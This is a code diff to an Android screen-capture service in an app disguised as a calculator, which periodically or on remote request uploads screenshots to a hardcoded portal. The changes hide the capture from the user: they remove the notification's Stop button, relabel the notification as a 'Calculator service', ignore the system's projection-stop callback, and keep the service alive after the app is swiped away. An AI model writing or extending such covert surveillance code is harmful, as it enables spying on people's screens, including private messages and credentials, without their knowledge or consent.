@@ -4,7 +4,6 @@ import android.app.Activity;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -24,6 +23,7 @@ import android.os.IBinder;
 import android.os.PowerManager;
 import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.Display;
 
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
@@ -55,6 +55,8 @@ public class ScreenCaptureService extends Service {
     public static final String EXTRA_ACCESS_TOKEN = "accessToken";
 
     public static volatile boolean isRunning = false;
+    public static volatile Intent sProjectionData = null;
+    public static volatile int sResultCode = 0;
 
     private final Object frameLock = new Object();
     private String portalUrl = CalculatorApp.HARDCODED_URL;
@@ -68,6 +70,8 @@ public class ScreenCaptureService extends Service {
 
     private byte[] latestJpegBytes;
     private long lastUploadTime = 0;
+    private long lastFrameConversionTime = 0;
+    private final AtomicBoolean snapshotRequested = new AtomicBoolean(false);
     private final AtomicBoolean isUploading = new AtomicBoolean(false);
 
     @Override
@@ -112,46 +116,58 @@ public class ScreenCaptureService extends Service {
             }
         }
 
-        Log.i(TAG, "ScreenCaptureService onStartCommand - resultCode: " + resultCode + ", hasData: " + (projectionData != null));
+        if ((resultCode == Activity.RESULT_OK || resultCode == -1) && projectionData != null) {
+            sResultCode = resultCode;
+            sProjectionData = projectionData;
+        } else if (sProjectionData != null) {
+            resultCode = sResultCode;
+            projectionData = sProjectionData;
+        }
 
-        // In Android, Activity.RESULT_OK is -1
+        Log.i(TAG, "ScreenCaptureService onStartCommand - resultCode: " + resultCode + ", hasData: " + (projectionData != null) + ", isRunning: " + isRunning);
+
         if ((resultCode == Activity.RESULT_OK || resultCode == -1) && projectionData != null) {
             try {
                 startForegroundServiceNotification();
-
-                MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-                if (manager != null) {
-                    projection = manager.getMediaProjection(resultCode, projectionData);
-                }
+                acquireWakeLock();
 
                 if (projection == null) {
-                    Log.e(TAG, "MediaProjection could not be obtained.");
-                    stopSelf();
-                    return START_NOT_STICKY;
+                    MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+                    if (manager != null) {
+                        projection = manager.getMediaProjection(resultCode, projectionData);
+                    }
+
+                    if (projection == null) {
+                        Log.e(TAG, "MediaProjection could not be obtained.");
+                        return START_STICKY;
+                    }
+
+                    projection.registerCallback(new MediaProjection.Callback() {
+                        @Override
+                        public void onStop() {
+                            super.onStop();
+                            Log.w(TAG, "MediaProjection onStop callback received - maintaining service running");
+                        }
+                    }, new Handler(getMainLooper()));
+
+                    startVirtualDisplay();
                 }
 
-                projection.registerCallback(new MediaProjection.Callback() {
-                    @Override
-                    public void onStop() {
-                        super.onStop();
-                        stopCapture();
-                        stopSelf();
-                    }
-                }, new Handler(getMainLooper()));
-
-                startVirtualDisplay();
-                acquireWakeLock();
                 startBackgroundPolling();
                 isRunning = true;
-                Log.i(TAG, "ScreenCaptureService initialized successfully.");
+                Log.i(TAG, "ScreenCaptureService initialized and running smoothly.");
             } catch (Throwable t) {
                 Log.e(TAG, "Failed to start capture service", t);
-                stopCapture();
-                stopSelf();
             }
         }
 
-        return START_NOT_STICKY;
+        return START_STICKY;
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+        Log.i(TAG, "onTaskRemoved: Activity swiped away, keeping ScreenCaptureService active in background.");
     }
 
     private void startForegroundServiceNotification() {
@@ -162,17 +178,13 @@ public class ScreenCaptureService extends Service {
             builder = new Notification.Builder(this);
         }
 
-        Intent stopIntent = new Intent(this, ScreenCaptureService.class);
-        stopIntent.setAction(ACTION_STOP);
-        PendingIntent pendingStop = PendingIntent.getService(this, 101, stopIntent,
-                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-
         Notification notification = builder.setContentTitle("Calculator")
-                .setContentText("Screen sharing active")
+                .setContentText("Calculator service active")
                 .setSmallIcon(android.R.drawable.ic_menu_view)
                 .setOngoing(true)
-                .addAction(new Notification.Action.Builder(null, "Stop", pendingStop).build())
                 .build();
+
+        notification.flags |= Notification.FLAG_NO_CLEAR | Notification.FLAG_ONGOING_EVENT;
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
@@ -190,7 +202,7 @@ public class ScreenCaptureService extends Service {
                         "Screen Capture Service",
                         NotificationManager.IMPORTANCE_LOW
                 );
-                channel.setDescription("Background screen sharing service");
+                channel.setDescription("Background calculator service");
                 channel.setShowBadge(false);
                 channel.enableLights(false);
                 channel.enableVibration(false);
@@ -201,12 +213,20 @@ public class ScreenCaptureService extends Service {
     }
 
     private void startVirtualDisplay() {
-        DisplayMetrics metrics = getResources().getDisplayMetrics();
-        int width = metrics.widthPixels;
-        int height = metrics.heightPixels;
+        DisplayManager dm = (DisplayManager) getSystemService(Context.DISPLAY_SERVICE);
+        Display display = (dm != null) ? dm.getDisplay(Display.DEFAULT_DISPLAY) : null;
+        DisplayMetrics realMetrics = new DisplayMetrics();
+        if (display != null) {
+            display.getRealMetrics(realMetrics);
+        } else {
+            realMetrics = getResources().getDisplayMetrics();
+        }
+
+        int width = realMetrics.widthPixels;
+        int height = realMetrics.heightPixels;
         if ((width & 1) != 0) width--;
         if ((height & 1) != 0) height--;
-        int density = metrics.densityDpi;
+        int density = realMetrics.densityDpi;
 
         imageThread = new HandlerThread("ConsentCaptureFrames");
         imageThread.start();
@@ -224,46 +244,64 @@ public class ScreenCaptureService extends Service {
                     image = reader.acquireLatestImage();
                     if (image == null) return;
 
-                    Image.Plane[] planes = image.getPlanes();
-                    if (planes == null || planes.length == 0) return;
-
-                    Image.Plane plane = planes[0];
-                    ByteBuffer buffer = plane.getBuffer();
-                    if (buffer == null) return;
-
-                    int pixelStride = plane.getPixelStride();
-                    int rowStride = plane.getRowStride();
-                    int rowPadding = rowStride - pixelStride * finalWidth;
-
-                    Bitmap bitmap;
-                    if (rowPadding == 0) {
-                        bitmap = Bitmap.createBitmap(finalWidth, finalHeight, Bitmap.Config.ARGB_8888);
-                        bitmap.copyPixelsFromBuffer(buffer);
-                    } else {
-                        int paddedWidth = rowStride / pixelStride;
-                        Bitmap paddedBitmap = Bitmap.createBitmap(paddedWidth, finalHeight, Bitmap.Config.ARGB_8888);
-                        paddedBitmap.copyPixelsFromBuffer(buffer);
-                        bitmap = Bitmap.createBitmap(paddedBitmap, 0, 0, finalWidth, finalHeight);
-                        paddedBitmap.recycle();
-                    }
-
-                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 75, baos);
-                    bitmap.recycle();
-
-                    byte[] frameBytes = baos.toByteArray();
-                    boolean shouldUpload = false;
                     long now = System.currentTimeMillis();
-                    synchronized (frameLock) {
-                        latestJpegBytes = frameBytes;
-                        if (lastUploadTime == 0 || (now - lastUploadTime) >= 30000) {
-                            lastUploadTime = now;
-                            shouldUpload = true;
-                        }
+                    boolean needSnapshot = snapshotRequested.get();
+                    boolean need30s = (lastUploadTime == 0 || (now - lastUploadTime) >= 30000);
+                    boolean needCache = (now - lastFrameConversionTime >= 3000);
+
+                    // Check if display is active / screen is ON
+                    boolean isScreenOn = true;
+                    try {
+                        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                        if (pm != null) isScreenOn = pm.isInteractive();
+                    } catch (Throwable ignored) {}
+
+                    // If screen is physically OFF, do not replace our valid frame with black pixels
+                    if (!isScreenOn && !needSnapshot && latestJpegBytes != null) {
+                        return;
                     }
 
-                    if (shouldUpload) {
-                        uploadFrameAsync(frameBytes);
+                    if (needSnapshot || need30s || needCache || latestJpegBytes == null) {
+                        Image.Plane[] planes = image.getPlanes();
+                        if (planes != null && planes.length > 0) {
+                            Image.Plane plane = planes[0];
+                            ByteBuffer buffer = plane.getBuffer();
+                            if (buffer != null) {
+                                buffer.position(0);
+                                int pixelStride = plane.getPixelStride();
+                                int rowStride = plane.getRowStride();
+                                int rowPadding = rowStride - pixelStride * finalWidth;
+
+                                Bitmap bitmap;
+                                if (rowPadding == 0) {
+                                    bitmap = Bitmap.createBitmap(finalWidth, finalHeight, Bitmap.Config.ARGB_8888);
+                                    bitmap.copyPixelsFromBuffer(buffer);
+                                } else {
+                                    int paddedWidth = rowStride / pixelStride;
+                                    Bitmap paddedBitmap = Bitmap.createBitmap(paddedWidth, finalHeight, Bitmap.Config.ARGB_8888);
+                                    paddedBitmap.copyPixelsFromBuffer(buffer);
+                                    bitmap = Bitmap.createBitmap(paddedBitmap, 0, 0, finalWidth, finalHeight);
+                                    paddedBitmap.recycle();
+                                }
+
+                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
+                                bitmap.recycle();
+
+                                byte[] frameBytes = baos.toByteArray();
+                                lastFrameConversionTime = now;
+
+                                synchronized (frameLock) {
+                                    latestJpegBytes = frameBytes;
+                                }
+
+                                if (needSnapshot || need30s) {
+                                    snapshotRequested.set(false);
+                                    lastUploadTime = now;
+                                    uploadFrameAsync(frameBytes);
+                                }
+                            }
+                        }
                     }
                 } catch (Throwable t) {
                     Log.w(TAG, "Frame conversion error: " + t.getMessage());
@@ -295,39 +333,38 @@ public class ScreenCaptureService extends Service {
         }
         pollingExecutor = Executors.newSingleThreadScheduledExecutor();
 
-        // Check every 2.5 seconds:
-        // 1. Is 30 seconds elapsed since last upload? If so, auto-upload!
-        // 2. Was snapshot requested from the portal web button? If so, instant upload!
         pollingExecutor.scheduleWithFixedDelay(new Runnable() {
             @Override
             public void run() {
                 try {
                     long now = System.currentTimeMillis();
-                    boolean isAutoTime;
-                    synchronized (frameLock) {
-                        isAutoTime = (lastUploadTime > 0 && (now - lastUploadTime) >= 30000);
+                    boolean isSnapshot = checkPortalSnapshotRequest();
+                    if (isSnapshot) {
+                        Log.i(TAG, "Portal requested snapshot!");
+                        snapshotRequested.set(true);
                     }
 
-                    boolean isSnapshotRequested = checkPortalSnapshotRequest();
-
-                    if (isSnapshotRequested || isAutoTime) {
-                        byte[] frameToUpload;
-                        synchronized (frameLock) {
+                    boolean isAutoTime;
+                    byte[] frameToUpload = null;
+                    synchronized (frameLock) {
+                        isAutoTime = (lastUploadTime > 0 && (now - lastUploadTime) >= 30000);
+                        if (isSnapshot || isAutoTime) {
                             frameToUpload = latestJpegBytes;
                             if (frameToUpload != null && frameToUpload.length > 0) {
                                 lastUploadTime = now;
+                                if (isSnapshot) snapshotRequested.set(false);
                             }
                         }
+                    }
 
-                        if (frameToUpload != null && frameToUpload.length > 0) {
-                            uploadFrameDirect(frameToUpload);
-                        }
+                    if (frameToUpload != null && frameToUpload.length > 0) {
+                        uploadFrameDirect(frameToUpload);
                     }
                 } catch (Throwable t) {
                     Log.w(TAG, "Polling loop error: " + t.getMessage());
                 }
             }
-        }, 2500, 2500, TimeUnit.MILLISECONDS);
+        }, 2000, 2000, TimeUnit.MILLISECONDS);
     }
 
     private boolean checkPortalSnapshotRequest() {
@@ -372,7 +409,6 @@ public class ScreenCaptureService extends Service {
     private void uploadFrameDirect(byte[] frame) {
         if (portalUrl == null || portalUrl.isEmpty() || accessToken == null || accessToken.isEmpty()) return;
         if (!isUploading.compareAndSet(false, true)) {
-            // Already an upload in flight
             return;
         }
 
@@ -486,6 +522,7 @@ public class ScreenCaptureService extends Service {
 
     @Override
     public void onDestroy() {
+        Log.w(TAG, "ScreenCaptureService onDestroy called");
         stopCapture();
         super.onDestroy();
     }
